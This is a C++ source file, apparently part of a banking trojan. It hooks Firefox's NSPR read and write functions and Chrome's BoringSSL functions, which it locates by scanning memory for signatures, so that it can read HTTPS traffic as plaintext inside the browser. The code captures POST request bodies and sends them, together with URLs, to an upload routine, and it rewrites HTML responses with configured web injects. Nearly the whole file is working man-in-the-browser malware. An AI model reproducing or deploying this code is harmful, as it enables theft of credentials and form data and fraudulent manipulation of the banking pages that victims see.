#include "..\Common.h"
#include "..\MinHook\include\MinHook.h"
#include "..\AiJson\AiJson.h"
#include "BrowserUtils.h"
#include "WebInjects.h"
#include "FirefoxChrome.h"

static enum ChunkSizeStatus { reading, read, error};
static enum Browser         { chrome, firefox };

static char *g_browserNames[2];

struct Request
{
   AiList *injects;
   void   *id;
   char   *buffer;
   char   *headers;
   char    chunkSizeStr[12];
   DWORD   chunkSize;
   DWORD   chunkRead;
   DWORD   bufferSize;
   DWORD   sent;
   DWORD   contentLength;
   DWORD   headersSize;
   BOOL    readAll;
   BOOL    headersRead;
   BOOL    notFirstRequest;
   BOOL    headersSent;
   BOOL    chunked;
   ChunkSizeStatus chunkSizeStatus;
};

struct PostData
{
   PCHAR buffer;
   DWORD bufferSize;
};

#pragma region getChromeAddresses
  /*************************************************************************************************************************/
 /* Start of code taken from: https://github.com/WPO-Foundation/webpagetest/blob/master/agent/wpthook/hook_chrome_ssl.cc  */
/*************************************************************************************************************************/
typedef struct
{
  DWORD max_chrome_ver;
  DWORD min_chrome_ver;
  DWORD count;
  DWORD signature_len;
  const char * signature_bytes;
  const void **hhlen;
  int hhlen_index;
  int ssl_new_index;
  int ssl_free_index;
  int ssl_connect_index;
  int ssl_begin_handshake_index;
  int ssl_read_app_data_old_index;
  int ssl_read_app_data_index;
  int ssl_write_app_data_index;
} SSL_METHODS_SIGNATURE;

static SSL_METHODS_SIGNATURE methods_signatures[] = {
  // August 2016 - hhlen is switched for ssl max DWORD
  { 0,          // No max, current signature
    54,         // Started in Chrome 54
    21,         // count
    8,          // 8-byte signature
    "\x0\x0\x0\x3\x4\x3\x0\x0", // signature
    0,          // hhlen
    -1,         // hhlen_index
    2,          // ssl_new_index
    3,          // ssl_free_index
    -1,         // ssl_connect_index
    -1,         // ssl_begin_handshake_index
    -1,         // ssl_read_app_data_old_index
    7,          // ssl_read_app_data_index
    10}         // ssl_write_app_data_index

  //#ifndef _WIN64
  // Chrome 53
  ,{53,         // Ended in Chrome 53
    53,         // Started in Chrome 53
    14,         // count
    4,          // Signature len
    "\x0\x0\x0\x0", // signature
    (const void **)4,          // hhlen
    9,          // hhlen_index
    0,          // ssl_new_index
    1,          // ssl_free_index
    -1,         // ssl_connect_index
    -1,         // ssl_begin_handshake_index
    3,          // ssl_read_app_data_old_index
    -1,         // ssl_read_app_data_index
    6}          // ssl_write_app_data_index

  // Nov 2015
  ,{52,         // Ended in Chrome 52
    0,          // No start version
    13,         // count
    4,          // Signature len
    "\x0\x0\x0\x0", // signature
    (const void **)4,          // hhlen value
    11,         // hhlen_index
    0,          // ssl_new_index
    1,          // ssl_free_index
    3,          // ssl_connect_index
    -1,         // ssl_begin_handshake_index
    5,          // ssl_read_app_data_old_index
    -1,         // ssl_read_app_data_index
    8}          // ssl_write_app_data_index
  //#endif
};

static const DWORD max_methods_struct_size = 80;

  /***********************************************************************************************************************/
 /* End of code taken from: https://github.com/WPO-Foundation/webpagetest/blob/master/agent/wpthook/hook_chrome_ssl.cc  */
/***********************************************************************************************************************/
#pragma endregion

static int (*Real_SSL3_Read_App_Data_Old) (void *id, char *buf, int len, int peek)                     = 0;
static int (*Real_SSL3_Read_App_Data) (void *id, int *out_got_handshake, char *buf, int len, int peek) = 0;
static int (*Real_SSL3_Write_App_Data) (void *id, char *buf, int len)                                  = 0;

static int (*Real_PR_Read)(void *id, char *buf, int len)                                               = 0;
static int (*Real_PR_Write)(void *id, char *buf, int len)                                              = 0;

static Request          g_requests[MAX_REQUESTS] = { 0 };
static PostData         g_postData               = { 0 };
static CRITICAL_SECTION g_requestCritSec;
static CRITICAL_SECTION g_writeCritSec;
static Browser          g_browser;


static void AddRequest(void *id, char *host, char *path)
{
   Funcs::pEnterCriticalSection(&g_requestCritSec);
   for(DWORD i = 0; i < MAX_REQUESTS; ++i)
   {
      if(!g_requests[i].id)
      {
         g_requests[i].id = id;
         break;
      }
   }
   Funcs::pLeaveCriticalSection(&g_requestCritSec);
}

static void RemoveRequest(void *id)
{
   Funcs::pEnterCriticalSection(&g_requestCritSec);
   for(DWORD i = 0; i < MAX_REQUESTS; ++i)
   {
      if(g_requests[i].id == id)
      {
         Funcs::pFree(g_requests[i].buffer);
         Funcs::pFree(g_requests[i].headers);
         Funcs::pMemset(&g_requests[i], 0, sizeof(g_requests[i])); 
         break;
      }
   }
   Funcs::pLeaveCriticalSection(&g_requestCritSec);
}

static Request *GetRequest(void *id)
{
   Funcs::pEnterCriticalSection(&g_requestCritSec);
   for(DWORD i = 0; i < MAX_REQUESTS; ++i)
   {
      if(g_requests[i].id == id)
      {
         Funcs::pLeaveCriticalSection(&g_requestCritSec);
         return &g_requests[i];
      } 
   }
   Funcs::pLeaveCriticalSection(&g_requestCritSec);
   return NULL;
}

static DWORD ReadChunkSize(Request *request, BYTE *buf, int len)
{
   DWORD chunkSizeStrSize = Funcs::pLstrlenA(request->chunkSizeStr);
   int i = 0;
   for(; i < len; ++i)
   {
      if(i >= sizeof(request->chunkSizeStr))
      {
         request->chunkSizeStatus = ChunkSizeStatus::error;
         return 0;
      }
      request->chunkSizeStr[chunkSizeStrSize + i] = buf[i];
      if(buf[i] == '\n')
      {
         request->chunkSizeStr[chunkSizeStrSize + i - 1] = 0;
         request->chunkSize = Funcs::pStrtol(request->chunkSizeStr, NULL, 16);
         Funcs::pMemset(request->chunkSizeStr, 0, sizeof(request->chunkSizeStr));
         request->chunkSizeStatus = ChunkSizeStatus::read;
         return i + 1;
      }
   }
   request->chunkSizeStatus = ChunkSizeStatus::reading;
   return 0;
}

static BOOL ReadChunk(Request *request, BYTE *buf, int len)
{
   BYTE *chunkPart     = buf;
   DWORD chunkPartSize = len;
   if(request->chunkRead == request->chunkSize)
   {
      DWORD chunkSizePartSize = ReadChunkSize(request, buf, len);
      if(!request->chunkSize)
         return TRUE;
      else if(request->chunkSizeStatus == ChunkSizeStatus::error)
         return FALSE;
      else if(request->chunkSizeStatus == ChunkSizeStatus::reading)
         return TRUE;
      chunkPart     += chunkSizePartSize;
      chunkPartSize -= chunkSizePartSize;
      request->chunkRead =  0;
      request->chunkSize += 2;
   }
   if(chunkPartSize)
   {
      DWORD chunkLeftToRead = request->chunkSize - request->chunkRead;
      DWORD chunkSizeToRead = chunkPartSize;
      if(chunkPartSize > chunkLeftToRead)
         chunkSizeToRead = chunkLeftToRead;
      else if(chunkPartSize == chunkLeftToRead)
      {
         chunkSizeToRead    -= 2;
         request->chunkSize -= 2;
      }
      if(!request->buffer)
         request->buffer = (char *) Alloc(chunkSizeToRead + 1);
      else
         request->buffer = (char *) ReAlloc(request->buffer, request->bufferSize + chunkSizeToRead + 1);
      Funcs::pMemcpy(request->buffer + request->bufferSize, chunkPart, chunkSizeToRead);
      request->bufferSize += chunkSizeToRead;
      request->chunkRead  += chunkSizeToRead;
      if(chunkPartSize > chunkLeftToRead)
         return ReadChunk(request, chunkPart + chunkSizeToRead, chunkPartSize - chunkSizeToRead);
   }
   return TRUE;
}

static void UploadLog()
{
   BOOL inject;
   char *url = GetUrlHeaders(g_postData.buffer, &inject);
   UploadLog((char *) g_browserNames[g_browser], url, g_postData.buffer, inject);
   Funcs::pFree(url); 

   Funcs::pFree(g_postData.buffer);
   g_postData.buffer = NULL;
}

static int WriteProxy(void *id, char *buf, int len)
{
   EnterCriticalSection(&g_writeCritSec);
   BOOL post = !Funcs::pStrncmp((char*) buf, Strs::postSpace, 5);
   BOOL get  = !Funcs::pStrncmp((char*) buf, Strs::getSpace, 4);

   if(!g_postData.buffer)
   {
      if(post)
      {
         g_postData.buffer = (char *) Alloc(len + 1);
         g_postData.buffer[len] = 0;
            
         Funcs::pMemcpy(g_postData.buffer, buf, len);
         g_postData.bufferSize = len;

         char *contentLength = FindStrSandwich(g_postData.buffer, Strs::fc1, Strs::winNewLine);
         char *endHeaders = Funcs::pStrStrA(g_postData.buffer, Strs::headersEnd);
         if(!contentLength || !endHeaders)
         {
            Funcs::pFree(g_postData.buffer);
            g_postData.buffer = NULL;
         }
         else
         {
            if(endHeaders != g_postData.buffer + len - 4 || Funcs::pStrToIntA(contentLength) == 0)
               UploadLog();
         }
      }
   }
   else
   {
      g_postData.buffer = (char *) ReAlloc(g_postData.buffer, g_postData.bufferSize + len + 1);
      Funcs::pMemcpy(g_postData.buffer + g_postData.bufferSize, buf, len);
      g_postData.bufferSize += len;
      g_postData.buffer[g_postData.bufferSize] = 0;

      UploadLog();
   }
   if(post || get)
   {
      char *replacedBuffer = (char *) Alloc(len + 1);
      Funcs::pMemcpy(replacedBuffer, buf, len);

      char *path = GetPath(replacedBuffer),
           *host = GetHost(replacedBuffer);

      if(path && host)
      {
         AiList *injects = GetWebInject(host, path);
         if(injects) 
         {
            replacedBuffer[len] = 0;
            ReplaceHeader(&replacedBuffer, Strs::fc2, Strs::fc3);
            len = Funcs::pLstrlenA(replacedBuffer);
            AddRequest(id, host, path);
          
            Request *request = GetRequest(id);
            request->injects = injects;
         }
         else
         {
            Funcs::pFree(host);
            Funcs::pFree(path);
         }
      }
      else
      {
         Funcs::pFree(host);
         Funcs::pFree(path);
      }
      int ret = (g_browser == Browser::chrome) ?
         Real_SSL3_Write_App_Data(id, replacedBuffer, len) : 
         Real_PR_Write(id, replacedBuffer, len);
      Funcs::pFree(replacedBuffer);
      LeaveCriticalSection(&g_writeCritSec);
      return ret;
   }
   LeaveCriticalSection(&g_writeCritSec);
   return (g_browser == Browser::chrome) ?
      Real_SSL3_Write_App_Data(id, buf, len) : 
      Real_PR_Write(id, buf, len);   
}

static int ReadProxy(void *id, char *buf, int len, 
   int *chrome_out_got_handshake, int chrome_peek)
{
   Request *request = GetRequest(id);
   if(!request)
   {
      return (g_browser == Browser::chrome) ? 
      (
         Real_SSL3_Read_App_Data ? 
         Real_SSL3_Read_App_Data(id, chrome_out_got_handshake, buf, len, chrome_peek) : 
         Real_SSL3_Read_App_Data_Old(id, buf, len, chrome_peek)
      ) : Real_PR_Read(id, buf, len);
   }
   if(request->readAll)
   {
      if(!request->headersSent)
      {
          CHAR bufferSizeStr[10] = { 0 };
          Funcs::pWsprintfA(bufferSizeStr, Strs::sprintfIntEscape, request->bufferSize);
          ReplaceHeader(&request->headers, Strs::fc4, bufferSizeStr);
          ReplaceHeader(&request->headers, Strs::fc5, "");
          ReplaceHeader(&request->headers, Strs::fc6, Strs::fc7);
          DWORD headersSize = lstrlenA(request->headers);
          if((DWORD) len < headersSize)
          {
             RemoveRequest(id);
             return -1;
          }
          Funcs::pMemcpy(buf, request->headers, headersSize);
          request->headersSent = TRUE;
          return headersSize;
      }

      int ret, diff = request->bufferSize - request->sent;
      if(diff >= len)
      {
         Funcs::pMemcpy(buf, request->buffer + request->sent, len);
         ret = len;
         request->sent += ret;
      }
      else if(diff > 0)
      {
         Funcs::pMemcpy(buf, request->buffer + request->sent, diff);
         ret = diff;
         request->sent += ret;
      }
      else
      {
         RemoveRequest(id);
         ret = 0;
      }
      return ret;
   }

   if(request->headersRead && (request->bufferSize >= request->contentLength && !request->chunked) ||
     (!request->chunkSize && request->chunkSizeStatus == ChunkSizeStatus::read))
   {
      if(request->bufferSize)
      {
         request->buffer[request->bufferSize] = 0;
         char *contentType = FindStrSandwich(request->headers, Strs::fc8, Strs::winNewLine);
         if(Funcs::pStrStrIA(contentType, Strs::fc9))
         {
            ReplaceWebInjects(&request->buffer, request->injects);
            request->bufferSize = lstrlenA(request->buffer);
         }
         Funcs::pFree(contentType);
      }
      request->readAll = TRUE;
      buf[0] = ' ';
      return 1;
   }

   int ret = (g_browser == Browser::chrome) ? 
   (
      Real_SSL3_Read_App_Data ? 
      Real_SSL3_Read_App_Data(id, chrome_out_got_handshake, buf, len - 1, chrome_peek) : 
      Real_SSL3_Read_App_Data_Old(id, buf, len - 1, chrome_peek)
   ) : Real_PR_Read(id, buf, len - 1);

   if(ret <= 0)
      return ret;

   if(!request->headersRead)
   {
      buf[ret] = 0;
      char *headersPart = (char *) buf;
      DWORD firstLineSize;
      if (!request->notFirstRequest)
      {
         char *location = FindStrSandwich(headersPart, Strs::fc10, Strs::winNewLine);
         if (location)
         {
            Funcs::pFree(location);
            char *replacedBuffer = (char *) Alloc(ret + 1);
            Funcs::pMemcpy(replacedBuffer, buf, ret);
            replacedBuffer[ret] = 0;
            ReplaceHeader(&replacedBuffer, Strs::fc6, Strs::fc7);
            ret = lstrlenA(replacedBuffer);
            if (len < ret)
            {
               Funcs::pFree(replacedBuffer);
               RemoveRequest(id);
               return -1;
            }
            Funcs::pMemcpy(buf, replacedBuffer, ret);
            Funcs::pFree(replacedBuffer);
            RemoveRequest(id);
            return ret;
         }
         Funcs::pFree(location);

         char *endFirstLine = Funcs::pStrStrA(headersPart, Strs::winNewLine);
         if (!endFirstLine)
         {
            RemoveRequest(id);
            return -1;
         }
         firstLineSize = endFirstLine - headersPart + 2;
         headersPart   = endFirstLine;
         ret          -= firstLineSize - 2;
      }
      char *endHeader = Funcs::pStrStrA(headersPart, Strs::headersEnd);
      if(endHeader)
      {
         endHeader += 4;

         char *contentLengthStr = FindStrSandwich(headersPart, Strs::fc11, Strs::winNewLine);
         if(contentLengthStr)
            request->contentLength = Funcs::pStrToIntA(contentLengthStr);
         else
            request->chunked = TRUE; 
         Funcs::pFree(contentLengthStr);

         int headerSize = endHeader - headersPart;
         if(ret > headerSize)
         {
            if(request->contentLength)
            {
               request->bufferSize = ret - headerSize;
               if(request->bufferSize > request->contentLength)
                  request->bufferSize = request->contentLength; 
               request->buffer = (char *) Alloc(request->bufferSize + 1);
               Funcs::pMemcpy(request->buffer, headersPart + headerSize,  request->bufferSize);
            }
            else ReadChunk(request, (BYTE *) headersPart + headerSize, ret - headerSize);
         }

         ret = headerSize;
         if (!request->headers)
            request->headers = (char *) Alloc(ret + 1);
         else
            request->headers = (char *) ReAlloc(request->headers, request->headersSize + ret + 1);
         request->headers[request->headersSize + ret] = 0;
         Funcs::pMemcpy(request->headers + request->headersSize, headersPart, ret);

         request->headersRead = TRUE;
      }
      else
      {
         if (!request->headers)
            request->headers = (char *) Alloc(ret + 1);
         else
            request->headers = (char *) ReAlloc(request->headers, request->headersSize + ret + 1);
         Funcs::pMemcpy(request->headers + request->headersSize, headersPart, ret);
         request->headersSize += ret;
      }

      if(request->notFirstRequest)
      {
         buf[0] = ' ';
         return 1;
      }

      char *dummyHeader     = Strs::fc12;
      DWORD dummyHeaderSize = Funcs::pLstrlenA(dummyHeader);
      Funcs::pMemcpy(buf + firstLineSize, dummyHeader, dummyHeaderSize);
      request->notFirstRequest = TRUE;
      return firstLineSize + dummyHeaderSize;
   }

   if(!request->chunked)
   {
      if(request->bufferSize + ret > request->contentLength)
         ret = request->contentLength - request->bufferSize;
      if (!request->buffer)
         request->buffer = (char *) Alloc(ret + 1);
      else
         request->buffer = (char *) ReAlloc(request->buffer, request->bufferSize + ret + 1);
      Funcs::pMemcpy(request->buffer + request->bufferSize, buf, ret);
      request->bufferSize += ret;
   }
   else
   {
      if(!ReadChunk(request, (BYTE *) buf, ret))
      {
         RemoveRequest(id);
         return -1;
      }
   }
   buf[0] = ' ';
   return 1;
}

static int My_SSL3_Read_App_Data_Old(void *id, char *buf, int len, int peek)
{
   int i;
   return ReadProxy(id, buf, len, &i, peek);
}

static int My_SSL3_Read_App_Data(void *id, int *out_got_handshake, char *buf, int len, int peek)
{
   return ReadProxy(id, buf, len, out_got_handshake, peek);   
}

static int My_SSL3_Write_App_Data(void *id, char *buf, int len)
{
   return WriteProxy(id, buf, len);   
}

static int My_PR_Read(void *id, char *buf, int len)
{
   int i;
   return ReadProxy(id, buf, len, &i, 0);
}

static int My_PR_Write(void *id, char *buf, int len)
{
   return WriteProxy(id, buf, len);
}

static void Init()
{
   MH_Initialize();
   g_browserNames[Browser::firefox] = Strs::firefoxName;
   g_browserNames[Browser::chrome]  = Strs::chromeName;
   LoadWebInjects();        
   Funcs::pInitializeCriticalSection(&g_writeCritSec);
   Funcs::pInitializeCriticalSection(&g_requestCritSec);

   g_postData.buffer = NULL;
}

void HookFirefox()
{
   Init();
   g_browser = Browser::firefox;
   MH_CreateHookApi(Strs::wNspr4dll, Strs::prRead, My_PR_Read, (LPVOID *) &Real_PR_Read);
   MH_CreateHookApi(Strs::wNspr4dll, Strs::prWrite, My_PR_Write, (LPVOID *) &Real_PR_Write);
   MH_CreateHookApi(Strs::wNss3dll, Strs::prRead, My_PR_Read, (LPVOID *) &Real_PR_Read);
   MH_CreateHookApi(Strs::wNss3dll, Strs::prWrite, My_PR_Write, (LPVOID *) &Real_PR_Write);
   MH_EnableHook(MH_ALL_HOOKS);
}

void HookChrome()
{
   Init();
   g_browser = Browser::chrome;

#pragma region getChromeAddresses
  /*************************************************************************************************************************/
 /* Start of code taken from: https://github.com/WPO-Foundation/webpagetest/blob/master/agent/wpthook/hook_chrome_ssl.cc  */
/*************************************************************************************************************************/
   void **methods_addr = NULL;
   int    signature    = -1;
   DWORD  match_count  = 0;
   for(;;)
   {
      CHAR path[MAX_PATH] = { 0 };
      HMODULE module = Funcs::pGetModuleHandleA(Strs::chromeDll);
      DWORD chrome_version = 0;
      if(Funcs::pGetModuleFileNameA(module, path, _countof(path)))
      {
         DWORD unused;
         DWORD infoSize = Funcs::pGetFileVersionInfoSizeA(path, &unused);
         LPBYTE pVersion = NULL;
         if(infoSize)  
            pVersion = (LPBYTE) Alloc(infoSize);
         if(pVersion)
         {
            if(Funcs::pGetFileVersionInfoA(path, 0, infoSize, pVersion))
            {
               VS_FIXEDFILEINFO* info = NULL;
               UINT size = 0;
               if(Funcs::pVerQueryValueA(pVersion, TEXT("\\"), (LPVOID*)&info, &size))
               {
                  if(info)
                  {
                     chrome_version = HIWORD(info->dwFileVersionMS);
                  }
               }
            }
            Funcs::pFree(pVersion);
         } 
      }

      if(module)
      {
         char *base_addr = (char *)module;
         MODULEINFO module_info;
         if(Funcs::pGetModuleInformation(GetCurrentProcess(), module, &module_info, sizeof(module_info)))
         {
            char *end_addr = base_addr + module_info.SizeOfImage;
            PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)base_addr;
            PIMAGE_NT_HEADERS pNT = (PIMAGE_NT_HEADERS)(pDos->e_lfanew + base_addr);
            if(pNT->Signature == IMAGE_NT_SIGNATURE)
            {
               PIMAGE_SECTION_HEADER pSection = 0;
               for(int i = 0 ;i < pNT->FileHeader.NumberOfSections; i ++)
               {
                  pSection = (PIMAGE_SECTION_HEADER)((char *)pNT + sizeof(IMAGE_NT_HEADERS) + (sizeof(IMAGE_SECTION_HEADER)*i));
                  if(!Funcs::pLstrcmpA((char*)pSection->Name, Strs::rdata) && pSection->SizeOfRawData > max_methods_struct_size)
                  {
                     // Scan for a matching signature
                     int count = 0;
                     char * compare;
                     char * addr = (char *)(base_addr + pSection->VirtualAddress);
                     DWORD len = pSection->SizeOfRawData - max_methods_struct_size;
                     while(len)
                     {
                        compare = addr;
                                    
                        // All signatures start with at least a 3-byte 0 value
                        if(!Funcs::pMemcmp(compare, "\x0\x0\x0", 3))
                        {
                           // go through our list of matching signatures
                           for(int signum = 0; signum < _countof(methods_signatures); signum++)
                           {
                              SSL_METHODS_SIGNATURE * sig = &methods_signatures[signum];
                              if(chrome_version >= sig->min_chrome_ver && (!sig->max_chrome_ver || chrome_version <= sig->max_chrome_ver)) 
                              {
                                 // see if the signature matches
                                 if(!Funcs::pMemcmp(compare, sig->signature_bytes, sig->signature_len)) 
                                 {
                                    void ** functions = (void **) &compare[sig->signature_len];
                                    // if hhlen is defined, make sure it matches
                                    if(sig->hhlen_index < 0 || functions[sig->hhlen_index] == sig->hhlen) 
                                    {
                                       // see if all other entries are addresses in the chrome.dll address range
                                       bool ok = true;
                                       for(DWORD entry = 0; entry < sig->count; entry++)
                                       {
                                          if(entry != sig->hhlen_index)
                                          {
                                             if(functions[entry] < base_addr || functions[entry] > end_addr)
                                             {
                                                ok = false;
                                                break;
                                             }
                                          }
                                       }
                                       if(ok)
                                       {
                                          // Scan the next 1KB to see if the reference to boringssl is present (possibly flaky, verify with several builds)
                                          char * mem = compare;
                                          bool found = false;
                                          for(int str_offset = 0; str_offset < 1024 && !found && mem < end_addr; str_offset++)
                                          {
                                             if(!Funcs::pMemcmp(&mem[str_offset], "boringssl", 9))
                                                found = true;
                                          }
                                          if(found) 
                                          {
                                             match_count++;
                                             if(!methods_addr) 
                                             {
                                                methods_addr = functions;
                                                signature = signum;
                                             }
                                          }
                                       }
                                    }
                                 }
                              }
                           }
                        }

                        // Structure is pointer-aligned in memory
                        len -= sizeof(void *);
                        addr += sizeof(void *);
                     }
                  }
               }
            }
         }
      }

      if(match_count == 1 && methods_addr && signature >= 0)
         break;
      Funcs::pSleep(1000);
   }
  /***********************************************************************************************************************/
 /* End of code taken from: https://github.com/WPO-Foundation/webpagetest/blob/master/agent/wpthook/hook_chrome_ssl.cc  */
/***********************************************************************************************************************/
#pragma endregion

   if(methods_signatures[signature].ssl_read_app_data_index)
      MH_CreateHook(methods_addr[methods_signatures[signature].ssl_read_app_data_index], My_SSL3_Read_App_Data, (LPVOID *) &Real_SSL3_Read_App_Data);
   if(methods_signatures[signature].ssl_read_app_data_old_index)
      MH_CreateHook(methods_addr[methods_signatures[signature].ssl_read_app_data_old_index], My_SSL3_Read_App_Data_Old, (LPVOID *) &Real_SSL3_Read_App_Data_Old); 
   if(methods_signatures[signature].ssl_write_app_data_index)
      MH_CreateHook(methods_addr[methods_signatures[signature].ssl_write_app_data_index], My_SSL3_Write_App_Data, (LPVOID *) &Real_SSL3_Write_App_Data);
   MH_EnableHook(MH_ALL_HOOKS);
}


